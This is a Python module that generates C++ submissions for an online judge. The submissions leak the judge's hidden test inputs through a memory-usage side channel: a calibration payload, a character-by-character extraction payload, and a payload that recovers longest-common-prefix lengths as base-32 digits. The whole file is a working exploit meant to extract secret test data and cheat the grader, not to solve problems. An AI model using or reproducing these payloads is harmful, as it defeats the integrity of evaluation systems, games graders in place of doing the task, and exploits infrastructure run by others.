def get_calibration_payload(val):
    """
    Returns a C++ payload that allocates memory proportional to `val`.
    This is used during the calibration phase to find the linear regression mapping.
    """
    return f"""#include <iostream>
#include <vector>

void Memory(int val) {{
    // Allocate memory proportional to val.
    // The coefficients are approximate and will be calibrated by the extractor.
    std::vector<char>((val + 1) * 1900000);
}}

int main() {{
    Memory({val});
    return 0;
}}
"""

def get_character_extraction_payload(target, upper_bound_char=None):
    """
    Returns a C++ payload that tries to match `target` prefix.
    If it matches, it leaks the next character by allocating memory proportional to its ASCII value.
    If it does not match, it returns 0.
    """
    target_str = "".join(f"\\x{ord(c):02x}" for c in target)
    
    if upper_bound_char is not None:
        upper_bound_cpp = f"if(val < {ord(upper_bound_char)}) {{ Memory(val); }}"
    else:
        upper_bound_cpp = "Memory(val);"
        
    return f"""#include <iostream>
#include <vector>
#include <cstdio>

// Use a large fixed-size array to stabilize memory usage across different payload lengths.
char target[1<<23] = "{target_str}";

void Memory(int val) {{
    std::vector<char>((val + 1) * 1900000);
}}

int main() {{
    // Force the compiler to not optimize out the target array
    volatile char dummy = 0;
    for(int i = (1<<23) - 100; i < (1<<23); ++i) {{
        dummy ^= target[i];
    }}

    char val;
    int i;
    for(i = 0; target[i] != '\\0'; ++i) {{
        if(EOF == scanf("%c", &val)) {{
            return 0; // Target is longer than the input
        }}
        if(val != target[i]) {{
            return 0; // Mismatch
        }}
    }}
    
    // Matched the prefix. Now read the next character and leak it.
    if(EOF != scanf("%c", &val)) {{
        {upper_bound_cpp}
    }}
    
    return 0;
}}
"""

def get_lcp_extraction_payload(target, known_digits=None, query_idx=-1):
    """
    Returns a C++ payload that finds the Longest Common Prefix (LCP) length 
    between the input and `target` using a base-32 digit extraction method.
    If `query_idx` == -1, it outputs the highest non-zero digit index and value.
    If `query_idx` >= 0, it filters testcases based on `known_digits` and outputs the digit at `query_idx`.
    """
    if known_digits is None:
        known_digits = []
        
    target_str = "".join(f"\\x{ord(c):02x}" for c in target)
    
    match_conditions = ""
    for idx, val in known_digits:
        match_conditions += f"    if (((L >> ({idx} * 5)) & 31) != {val}) return 0;\n"
        
    return f"""#include <iostream>
#include <vector>
#include <cstdio>

char target[1<<23] = "{target_str}";

void Memory(int val) {{
    std::vector<char>((val + 1) * 1900000);
}}

int main() {{
    // Force the compiler to not optimize out the target array
    volatile char dummy = 0;
    for(int i = (1<<23) - 100; i < (1<<23); ++i) {{
        dummy ^= target[i];
    }}

    char val;
    int i;
    for(i = 0; true; ++i) {{
        if(EOF == scanf("%c", &val)) {{
            if(target[i] == '\\0') {{
                return 0; // Exact match, already processed
            }} else {{
                break; // Strict prefix, LCP is i
            }}
        }}
        // Because of the max-memory behavior of the OJ, we process testcases in Lexicographical descending order.
        if(val > target[i]) {{
            return 0; // This testcase is lexicographically larger than target, so it's already processed.
        }}
        if(val < target[i]) {{
            break; // Mismatch, found the LCP for this testcase.
        }}
    }}
    
    int L = i; 
    
{match_conditions}
    
    int out_val = 0;
    int query_idx = {query_idx};
    
    if (query_idx == -1) {{
        int highest_idx = 0;
        // Search up to index 5 (covers up to 2^30 length)
        for (int j = 5; j >= 0; --j) {{
            if (((L >> (j * 5)) & 31) > 0) {{
                highest_idx = j;
                break;
            }}
        }}
        int digit = (L >> (highest_idx * 5)) & 31;
        out_val = (highest_idx << 5) | digit;
    }} else {{
        int digit = (L >> (query_idx * 5)) & 31;
        out_val = (query_idx << 5) | digit;
    }}
    
    Memory(out_val);
    
    return 0;
}}
"""
